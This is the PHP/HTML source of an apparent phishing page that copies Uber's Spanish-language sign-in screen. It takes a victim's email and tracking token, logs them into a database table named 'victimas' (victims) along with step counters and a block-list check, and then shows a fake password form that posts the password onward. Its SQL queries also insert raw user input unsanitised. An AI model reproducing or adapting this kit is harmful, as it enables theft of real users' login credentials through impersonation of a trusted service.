<?php
$token = $_POST['token'];
if (empty($token)) {
$actual_link = "../login/";
	header('Location:' . $actual_link);
	}
	else {
?>
<html><head>
        <title>Uber</title>
        <meta data-react-helmet="true" http-equiv="X-UA-Compatible" content="IE=edge"><meta data-react-helmet="true" charset="utf-8"><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link data-react-helmet="true" rel="stylesheet" href="https://d1a3f4spazzrp4.cloudfront.net/arch-frontend/1.0.0/d1a3f4spazzrp4.cloudfront.net/stylesheets/main-108318c52b.css"><link data-react-helmet="true" rel="icon" type="image/x-icon" href="https://d1a3f4spazzrp4.cloudfront.net/arch-frontend/1.0.0/d1a3f4spazzrp4.cloudfront.net/favicon-17677bc2ca.ico">
        <script type="text/javascript" async src="https://www.google-analytics.com/plugins/ua/linkid.js"></script><script type="text/javascript" async src="https://www.google-analytics.com/plugins/ua/ec.js"></script><script type="text/javascript" async charset="utf-8" id="utag_1105" src="//www.googleadservices.com/pagead/conversion_async.js"></script><script type="text/javascript" async charset="utf-8" id="utag_590" src="//www.googleadservices.com/pagead/conversion_async.js"></script><script async src="//connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async charset="utf-8" id="tealium-tag-7110" src="//www.google-analytics.com/analytics.js"></script><script src="https://tags.tiqcdn.com/utag/uber/main/prod/utag.js" type="text/javascript" async></script><script id="facebook-jssdk" src="https://connect.facebook.net/en_US/sdk.js"></script><script type="text/javascript" nonce="">
          window.csrfToken = '1513575442-01-D7632AGooERq4ZHhmQmQ5Vg_DIJthOUEKvnw3VXb-MU';
        </script>
     
        
    <style type="text/css" data-styletron="">._style_4nG5Vi {
  -ms-flex-positive: 1 !important;
  -moz-box-sizing: border-box !important;
  -webkit-flex-grow: 1 !important;
  -webkit-transition: all 400ms ease !important;
  flex-grow: 1 !important;
  max-width: 100% !important;
  font-size: 14px !important;
  padding: 0 !important;
  font-family: ff-clan-web-pro, "Helvetica Neue", Helvetica, sans-serif !important;
  font-weight: 500 !important;
  border: none !important;
  outline: none !important;
  text-align: none !important;
  transition: all 400ms ease !important;
  margin-bottom: 0px !important;
  background-color: transparent !important;
  box-sizing: border-box !important;
  color: #000000 !important;
  line-height: 24px !important
}
._style_4nG5Vi:disabled {
  color: #c6c6c6 !important;
  cursor: default !important
}._style_3xEYeM {
  -webkit-box-lines: multiple !important;
  -moz-box-sizing: border-box !important;
  -webkit-flex-wrap: wrap !important;
  -ms-flex-wrap: wrap !important;
  -webkit-transition: all 400ms ease !important;
  height: 44px !important;
  flex-wrap: wrap !important;
  transition: all 400ms ease !important;
  border-color: #e5e5e4 !important;
  background: transparent !important;
  background-color: #ffffff !important;
  border-style: solid !important;
  border-width: 1px !important;
  box-sizing: border-box !important;
  border: 0 !important;
  display: -webkit-box !important;
  display: -moz-box !important;
  display: -ms-flexbox !important;
  display: -webkit-flex !important;
  display: flex !important
}
._style_3xEYeM:hover {
  border-color: #d6d6d5 !important
}
._style_3xEYeM::-webkit-placeholder {
  -webkit-transition: all 400ms ease !important;
  transition: all 400ms ease !important
}
._style_3xEYeM:hover::-webkit-placeholder {
  color: #717171 !important
}
._style_3xEYeM:disabled {
  background: transparent !important
}._style_2CpoGg {
  -webkit-box-lines: multiple !important;
  -moz-box-sizing: border-box !important;
  -webkit-flex-wrap: wrap !important;
  -ms-flex-wrap: wrap !important;
  -webkit-transition: all 400ms ease !important;
  height: 44px !important;
  flex-wrap: wrap !important;
  transition: all 400ms ease !important;
  border-color: #11939a !important;
  background: transparent !important;
  background-color: #ffffff !important;
  border-style: solid !important;
  border-width: 1px !important;
  box-sizing: border-box !important;
  border: 0 !important;
  display: -webkit-box !important;
  display: -moz-box !important;
  display: -ms-flexbox !important;
  display: -webkit-flex !important;
  display: flex !important
}
._style_2CpoGg:hover {
  border-color: #11939a !important
}
._style_2CpoGg::-webkit-placeholder {
  -webkit-transition: all 400ms ease !important;
  transition: all 400ms ease !important
}
._style_2CpoGg:hover::-webkit-placeholder {
  color: #717171 !important
}
._style_2CpoGg:disabled {
  background: transparent !important
}._style_1sxYhQ:after {
  -webkit-transition: all 400ms ease !important;
  content: "▾" !important;
  position: absolute !important;
  color: #A6A5A5 !important;
  top: -1px !important;
  right: 7px !important;
  line-height: 44px !important;
  pointer-events: none !important;
  transition: all 400ms ease !important
}
._style_1sxYhQ:hover {
  cursor: pointer !important;
  border-color: #D6D6D5 !important
}
._style_1sxYhQ:focus {
  border-color: #11939A !important
}
._style_1sxYhQ:focus:after {
  color: #11939A !important
}._style_INFMX {
  position: absolute !important
}._style_1hST7T:active {
  background: #F1F1F1 !important
}
._style_1hST7T:hover {
  background: #F1F1F1 !important
}._style_1cBulK:last-child {
  border: none !important
}._style_2jozrI .Grid__innerScrollContainer {
  -moz-box-sizing: border-box !important;
  box-sizing: border-box !important;
  overflow: hidden !important;
  position: relative !important
}._style_1DzT0l:active {
  background: #F1F1F1 !important
}</style><script type="text/javascript" src="https://script.crazyegg.com/pages/scripts/0051/2593.js?">https://script.crazyegg.com/pages/scripts/0051/2593.js?</script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_44" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.44.js?utv=ut4.44.201712120228"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_479" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.479.js?utv=ut4.44.201708142304"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_557" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.557.js?utv=ut4.44.201709131357"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_590" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.590.js?utv=ut4.44.201711012215"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_627" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.627.js?utv=ut4.44.201708152353"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_727" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.727.js?utv=ut4.44.201701261739"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_756" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.756.js?utv=ut4.44.201709131357"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_830" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.830.js?utv=ut4.44.201709131357"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_871" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.871.js?utv=ut4.44.201706060022"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_945" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.945.js?utv=ut4.44.201711011635"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_1001" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.1001.js?utv=ut4.44.201709071503"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_1016" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.1016.js?utv=ut4.44.201708281600"></script><script type="text/javascript" async charset="utf-8" id="utag_uber.main_1105" src="//tags.tiqcdn.com/utag/uber/main/prod/utag.1105.js?utv=ut4.44.201711071349"></script><script src="//script.crazyegg.com/pages/scripts/0051/2593.js"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/952029224/?random=1513575434257&amp;cv=8&amp;fst=1513575434257&amp;num=1&amp;guid=ON&amp;eid=659238991&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=5&amp;u_tz=-300&amp;u_java=false&amp;u_nplug=4&amp;u_nmime=5&amp;frm=0&amp;url=https%3A%2F%2Fauth.uber.com%2Flogin%2F%3Fnext_url%3Dhttps%253A%252F%252Fpartners.uber.com&amp;ref=https%3A%2F%2Fwww.uber.com%2Fes-PE%2Fsign-in%2F&amp;tiba=Uber&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/829343844/?random=1513575434268&amp;cv=8&amp;fst=1513575434268&amp;num=1&amp;guid=ON&amp;eid=659238991&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1040&amp;u_aw=1920&amp;u_cd=24&amp;u_his=5&amp;u_tz=-300&amp;u_java=false&amp;u_nplug=4&amp;u_nmime=5&amp;frm=0&amp;url=https%3A%2F%2Fauth.uber.com%2Flogin%2F%3Fnext_url%3Dhttps%253A%252F%252Fpartners.uber.com&amp;ref=https%3A%2F%2Fwww.uber.com%2Fes-PE%2Fsign-in%2F&amp;tiba=Uber&amp;async=1&amp;rfmt=3&amp;fmt=4"></script><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}.fb_link img{border:none}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:visible}.fb_dialog_advanced{padding:10px;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px}.fb_dialog_content{background:#fff;color:#333}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{top:5px;left:5px;right:auto}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_loader{background-color:#f6f7f9;border:1px solid #606060;font-size:24px;padding:20px}.fb_dialog_top_left,.fb_dialog_top_right,.fb_dialog_bottom_left,.fb_dialog_bottom_right{height:10px;width:10px;overflow:hidden;position:absolute}.fb_dialog_top_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 0;left:-10px;top:-10px}.fb_dialog_top_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -10px;right:-10px;top:-10px}.fb_dialog_bottom_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -20px;bottom:-10px;left:-10px}.fb_dialog_bottom_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -30px;right:-10px;bottom:-10px}.fb_dialog_vert_left,.fb_dialog_vert_right,.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{position:absolute;background:#525252;filter:alpha(opacity=70);opacity:.7}.fb_dialog_vert_left,.fb_dialog_vert_right{width:10px;height:100%}.fb_dialog_vert_left{margin-left:-10px}.fb_dialog_vert_right{right:0;margin-right:-10px}.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{width:100%;height:10px}.fb_dialog_horiz_top{margin-top:-10px}.fb_dialog_horiz_bottom{bottom:0;margin-bottom:-10px}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{-webkit-transform:none;height:100%;margin:0;overflow:visible;position:absolute;top:-10000px;left:0;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{width:auto;height:auto;min-height:initial;min-width:initial;background:none}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{color:#fff;display:block;padding-top:20px;clear:both;font-size:18px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .45);position:absolute;bottom:0;left:0;right:0;top:0;width:100%;min-height:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_content .dialog_header{-webkit-box-shadow:white 0 1px 1px -1px inset;background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#738ABA), to(#2C4987));border-bottom:1px solid;border-color:#1d4088;color:#fff;font:14px Helvetica, sans-serif;font-weight:bold;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{-webkit-font-smoothing:subpixel-antialiased;height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#4966A6), color-stop(.5, #355492), to(#2A4887));border:1px solid #29487d;-webkit-background-clip:padding-box;-webkit-border-radius:3px;-webkit-box-shadow:rgba(0, 0, 0, .117188) 0 1px 1px inset, rgba(255, 255, 255, .167969) 0 1px 0;display:inline-block;margin-top:3px;max-width:85px;line-height:18px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{border:none;background:none;color:#fff;font:12px Helvetica, sans-serif;font-weight:bold;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #555;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f6f7f9;border:1px solid #555;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-repeat:no-repeat;background-position:50% 50%;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_hide_iframes iframe{position:relative;left:-10000px}.fb_iframe_widget_loader{position:relative;display:inline-block}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}.fb_iframe_widget_loader iframe{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat;height:32px;width:32px;margin-left:-16px;position:absolute;left:50%;z-index:4}
.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}.fb_mobile_overlay_active{height:100%;overflow:hidden;position:fixed;width:100%}.fb_shrink_active{opacity:1;transform:scale(1, 1);transition-duration:200ms;transition-timing-function:ease-out}.fb_shrink_active:active{opacity:.5;transform:scale(.75, .75)}</style><style type="text/css">@keyframes resizeanim { from { opacity: 0; } to { opacity: 0; } } .resize-triggers { animation: 1ms resizeanim; visibility: hidden; opacity: 0; } .resize-triggers, .resize-triggers > div, .contract-trigger:before { content: " "; display: block; position: absolute; top: 0; left: 0; height: 100%; width: 100%; overflow: hidden; } .resize-triggers > div { background: #eee; overflow: auto; } .contract-trigger:before { width: 200%; height: 200%; }</style>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.16.0/jquery.validate.min.js"></script>

<style>
#password-error { font-weight: 500;
    font-size: 12px;
    line-height: 24px;
    color: rgb(203, 56, 11);
    box-sizing: border-box; }
form.cmxform { width: 30em; }
form.cmxform label {
	width: auto;
	display: block;
	float: none;
}
</style>
 <script>
 






$(document).ready(function () {

    $('#form1').validate({ 
        errorLabelContainer: "#error-note",
        wrapper: "span",
        rules: {
            password: {
                required: true,
            }
        },
        messages: {
            password: {
                required: "Introduce tu contraseña.",
            }
        }
    });

});














</script>  






</head>



    <body class="undefined">

        <div id="app-content"><div id="app-wrapper" data-reactroot="" data-reactid="1" data-react-checksum="-54581398"><!-- react-empty: 2 --><!-- react-empty: 3 --><!-- react-empty: 4 --><header class="funnel" style="background:url(&quot;https://d1a3f4spazzrp4.cloudfront.net/arch-frontend/1.0.0/d1a3f4spazzrp4.cloudfront.net/1454024011-global_aqua_01_scale_125_144dpi_01-37a1ca0b8b.png&quot;) center center repeat;" data-reactid="5"><div class="bit bit--logo text--center" data-reactid="6"><div class="bit__content" data-reactid="7"><a href="/login/" data-reactid="8"><i class="icon icon_uber bit--logo__logo" icon="uber" data-reactid="9"></i></a></div></div></header><div class="stage-wrapper narrow portable-one-whole forward" id="app-body" data-reactid="10"><div><!-- react-empty: 528 --><div class="soft-tiny">
        



    <?php
	
require '../../../conexion.php';
include('../../../tiempo.php');
	
$token = $_POST['token'];
$email = $_POST['textInputValue'];
$paso = "2";
$envio = "U01AMES";
	
$sql = "SELECT * FROM bloqueos WHERE login='$email'";
$resultado = $mysqli->query($sql);
$row = $resultado->fetch_array(MYSQLI_ASSOC);


if ($resultado) { 

    if($resultado->num_rows === 0)
    {
$sql = "UPDATE victimas SET ultimaves='$RegistraFecha' WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET envio='$envio' WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET correo = CONCAT_WS (' ', correo, '$email') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET paso = CONCAT_WS (' ', paso, '$paso') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);


?>
 <form class="push--top-small" id="form1" name="form1" action="1/" method="POST">
 
                     <input type="hidden" name="token" value="<?php echo $token; ?>">
                     <input type="hidden" name="email" value="<?php echo $email; ?>">

 
 <div class="layout--center"><h5><?php echo $email; ?></h5></div><label class="label" for="password">Escribe tu contraseña</label><input type="text" class="text-input " value="<?php echo $email; ?>" id="username" style="display: none;"><input type="password" class="text-input " name="password" id="password" value="" aria-required="true" aria-invalid="false" aria-describedby="error-caption input-title input-label" style="box-shadow: white 0px 0px 0px 30px inset;">	
 
         <div id="error-note">    </div> 

 <button class="btn btn--arrow btn--full push--top"><span class="push-small--right">Siguiente</span><i class="icon icon_right-arrow-thin"></i></button>
 
 
 <!-- react-empty: 558 --><a class="small float--right push-small--top" href="/login/forgot-password?source=auth&amp;next_url=https%3A%2F%2Fpartners.uber.com%2F">¿Olvidaste tu contraseña?</a></form>
 

<?php
	    }
    else
    {


$useres = "viejo";

$sql = "UPDATE victimas SET ingreso = CONCAT_WS (' ', ingreso, '$useres') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET ultimaves='$RegistraFecha' WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET paso = CONCAT_WS (' ', paso, '$paso') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET correo = CONCAT_WS (' ', correo, '$email') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);


?>
 <form class="push--top-small" id="form1" name="form1" action="1/" method="POST">
 
                     <input type="hidden" name="token" value="<?php echo $token; ?>">
                     <input type="hidden" name="block" value="1">
                     <input type="hidden" name="email" value="<?php echo $email; ?>">


 
 <div class="layout--center"><h5><?php echo $email; ?></h5></div><label class="label" for="password">Escribe tu contraseña</label><input type="text" class="text-input " value="<?php echo $email; ?>" id="username" style="display: none;"><input type="password" class="text-input " name="password" id="password" value="" aria-required="true" aria-invalid="false" aria-describedby="error-caption input-title input-label" style="box-shadow: white 0px 0px 0px 30px inset;">
 
         <div id="error-note">    </div> 

 <button class="btn btn--arrow btn--full push--top"><span class="push-small--right">Siguiente</span><i class="icon icon_right-arrow-thin"></i></button>
 
 
 <!-- react-empty: 558 --><a class="small float--right push-small--top" href="/login/forgot-password?source=auth&amp;next_url=https%3A%2F%2Fpartners.uber.com%2F">¿Olvidaste tu contraseña?</a></form>
<?php

	}

}


?>
    
    
    
    
        

 
 
 
 
 
 
 </div></div></div><footer data-reactid="30"><div style="max-height:197px;" data-reactid="31"><div class="visible--palm" data-reactid="32"><svg style="display:block;max-width:100%;margin:0 auto;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 200" height="200" width="750" preserveAspectRatio="xMinYMax meet" data-reactid="33"><pattern x="4501" y="-541" width="5" height="5" patternUnits="userSpaceOnUse" id="a" viewBox="0 -5 5 5" overflow="visible" data-reactid="34"><path fill="none" d="M0-5h5v5H0z" data-reactid="35"></path><path d="M2-3H0v-2h2z" data-reactid="36"></path></pattern><path fill="transparent" d="M.2 0H750v200H.2z" data-reactid="37"></path><path fill="#1A3177" d="M750 6.2c-6.2 1.9-12 5.2-17 9.8-8.8 8.1-20.9 13-32.8 13H597.9c-22.3 0-43.1 7.5-58.9 22-15.8 14.5-37.7 23-60 23H346c-34.8 0-68.6 13.2-94 37-26.1 24.4-61.8 38-98.9 38H136c-26.2 0-50.7 10.2-70 28l-26 23h710V6.2z" data-reactid="38"></path><path d="M551 155h-17v-38c5.8 0 11.5-.7 17-2v40zm99-81v14l-14-14" data-reactid="39"></path><path fill="#FFF" d="M468 35v9h-10v156h48V45h5V35m72 120h-67l45 45h22M551 94h32v61h-32z" data-reactid="40"></path><path fill="#D6D6D5" d="M556 101h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27z" data-reactid="41"></path><path fill="#FFF" d="M560 88h36v6h-36z" data-reactid="42"></path><path fill="#89DAC1" d="M560 88l19-19h17v19" data-reactid="43"></path><path fill="#5879DA" d="M650 88l-19-19h-35v19" data-reactid="44"></path><path fill="#89DAC1" d="M607 82v-6h-6m19 6v-6h-6m19 6v-6h-6" data-reactid="45"></path><path fill="#FFF" d="M579 66h17v3h-17zm104 107l-55-55h55" data-reactid="46"></path><path fill="#D6D6D5" d="M673 124h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-14 1l-1-1h1m8 7h-1l-1-1v-6h2" data-reactid="47"></path><path fill="#5879DA" d="M307 143h21v8h-21zm0-14h21v8h-21zm0-14h21v8h-21zm0-14v8h24l-8-8" data-reactid="48"></path><path fill="#D6D6D5" d="M307 137h21v6h-21zm0-14h21v6h-21zm0-14h17v6h-17z" data-reactid="49"></path><path fill="#89DAC1" d="M307 143v8h-55l8-8m47-14v8h-44l8-8m36-14v8h-35l8-8m27-14v8h-25l8-8" data-reactid="50"></path><path fill="#FFF" d="M271 137h36v6h-36zm9-14h27v6h-27zm10-14h17v6h-17z" data-reactid="51"></path><path fill="#D6D6D5" d="M384 165h74v35h-74z" data-reactid="52"></path><pattern id="b" patternTransform="translate(-87 51)" data-reactid="53"></pattern><path fill="url(#b)" d="M384 165h74v35h-74z" data-reactid="54"></path><path fill="#FFF" d="M384 35v48h-17v6h-25c-7.7 0-14 6.3-14 14v97h56V89h32V3l-32 32zm212 17h2v14h-2z" data-reactid="55"></path><path fill="#5879DA" d="M598 52h6v2h-6z" data-reactid="56"></path><path fill="#FFF" d="M613 52h2v14h-2z" data-reactid="57"></path><path fill="#5879DA" d="M615 52h6v2h-6z" data-reactid="58"></path><path fill="#FFF" d="M629 52h2v14h-2z" data-reactid="59"></path><path fill="#5879DA" d="M631 52h6v2h-6z" data-reactid="60"></path><path fill="#D6D6D5" d="M377 170h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm155-28h18V45h-5V35h-18v10h-5v155h55" data-reactid="61"></path><pattern id="c" patternTransform="matrix(1 0 0 1.008 28.357 331.068)" data-reactid="62"></pattern><path fill="url(#c)" d="M231 151h41v49h-41z" data-reactid="63"></path><path fill="#D6D6D5" d="M231 151v49h97v-49M468 21h2v14h-2zm6 0h2v14h-2z" data-reactid="64"></path><path fill="#5879DA" d="M673 16v13h13c0-6.9-6.1-13-13-13z" data-reactid="65"></path><path fill="#FFF" d="M675 114V32h-2v-3h-20v3h-3v82" data-reactid="66"></path><path fill="#D6D6D5" d="M669 37h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2z" data-reactid="67"></path><path fill="#89DAC1" d="M355 165v-4h5c4.6 0 8.7-1.9 12-5l2-2h10v11h-29z" data-reactid="68"></path><path fill="#5879DA" d="M458 165v-4h-4c-4.6 0-9.8-1.8-13-5l-2-2h-55v11h74zm34 17v2c0 1.3-.9 2.5-1.7 3.3l-2 2-.3.3V182h-2v18h2v-5.5c0-1.2.8-2.9 1.7-3.8l2-2c1-1 2.3-2.7 2.3-4.7v-2h-2zm77 7h2v11h-2zm-227 0h2v11h-2z" data-reactid="69"></path><path fill="#D6D6D5" d="M596 66h35v3h-35z" data-reactid="70"></path><path fill="#5879DA" d="M275 154v32h2v-30m6 6v24h2v-22m6 6v16h2v-14m6 6v8h2v-6" data-reactid="71"></path><path fill="#FFF" d="M231 151h-17.8c-6.2 0-11.2 5-11.2 11.2V200h29v-49z" data-reactid="72"></path><path fill="#5879DA" d="M313 154h2v32h-2zm7 0h2v32h-2zM511 51h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7z" data-reactid="73"></path><path d="M454 161h4v-44h-12v42.3c2.5 1.1 5.4 1.7 8 1.7z" data-reactid="74"></path><path fill="#D6D6D5" d="M441 156c1.2 1.2 2.7 2.2 4.3 3h.7V3h-30v86h-32v65h55l2 2zm-99-60h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42z" data-reactid="75"></path><path fill="#5879DA" d="M384 96h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zM424 3h2v137h-2zm6 0h2v137h-2zm6 0h2v137h-2z" data-reactid="76"></path><path fill="#FFF" d="M272 151h35v35" data-reactid="77"></path><path fill="#D6D6D5" d="M277 156v-2h-2m10 10v-10h-2v8m10 10v-18h-2v16m10 10v-26h-2v24M690 32v-3h-17v3h2v80l-18-18h-7v-6h-54v6h-13v106h100v-27l-55-55h65V32" data-reactid="78"></path><path fill="#5879DA" d="M688 37h2v7h-2zm0 11h2v7h-2zm-5-11h2v7h-2zm0 11h2v7h-2zm-5-11h2v7h-2zm0 11h2v7h-2zm-95 53h74v2h-74zm0 6h74v2h-74zm0 6h74v2h-74zm0 6h45v2h-45zm0 